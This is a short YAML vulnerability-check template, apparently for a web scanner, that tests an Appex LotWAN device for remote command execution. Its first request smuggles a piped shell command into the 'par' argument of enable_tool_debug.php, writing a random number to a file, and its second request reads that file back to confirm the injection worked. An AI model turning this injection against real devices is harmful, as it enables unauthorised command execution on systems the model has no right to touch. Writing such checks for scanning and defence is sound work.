name: yaml-poc-appex-lotwan-rce-CT-601556
binding: 22aca746-718c-4d21-8c5a-2c06653b809a
detail:
    author: haiqing.chen
    vulnerability:
        id: 4bf64ea9-f788-4754-baee-02b6b14a012e
        level: critical
    warning: Harmless
transport: http
set:
    r1: randomInt(100000, 999999)
    r2: randomInt(100000, 999999)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /acc/tools/enable_tool_debug.php?val=0&tool=1&par=-c+1+localhost+%7c+echo+{{r1}}+%3e+{{r2}}.txt+%7c%7c+a
        expression: response.status == 200
    r1:
        request:
            cache: true
            method: GET
            path: /acc/tools/{{r2}}.txt
        expression: response.status == 200 && response.body_string.contains(string(r1))
expression: r0() && r1()
